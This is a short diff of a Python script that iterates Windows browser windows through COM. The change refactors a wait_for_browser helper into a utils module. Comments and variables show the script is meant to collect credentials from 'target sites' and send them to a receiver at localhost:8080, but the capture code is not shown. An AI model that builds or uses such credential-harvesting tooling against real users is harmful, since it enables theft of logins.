@@ -1,10 +1,10 @@
-import pythoncom
 import win32com.client
-import time
 import urlparse
 import urllib
 
 # here we will receive the credentials from our target sites
+from utils.browserutils import wait_for_browser
+
 data_receiver = "http://localhost:8080/"
 
 target_sites = {}
@@ -40,11 +40,6 @@ xl = win32com.client.Dispatch("Excel.Application")
 '''
 
 windows = win32com.client.Dispatch(clsid)
-
-def wait_for_browser(browser):
-    while browser.ReadyState != 4 and browser.ReadyState != "complete":
-        time.sleep(0.1)
-    return
 
 while True:
     for browser in windows:
